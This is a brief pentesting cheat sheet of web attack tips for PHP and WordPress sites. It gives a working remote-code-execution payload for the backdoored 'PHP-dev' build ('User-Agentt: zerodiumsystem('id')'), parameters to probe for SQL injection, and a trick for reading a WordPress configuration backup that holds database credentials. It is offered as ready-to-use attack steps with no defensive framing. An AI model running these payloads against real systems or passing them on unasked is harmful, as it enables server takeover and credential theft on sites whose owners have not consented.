1) If the Php version is `PHP-dev` then we can try for RCE & SQli.
```
User-Agentt: zerodiumsleep(5); User-Agentt: zerodiumsystem('id');
```
2) look for endpoint like .php and test parameter for `id` and `list[select]` parameters for sqli
3) if `wp-config.php` -> 403 forbidden then `wp-config.php.bak` -> 200Ok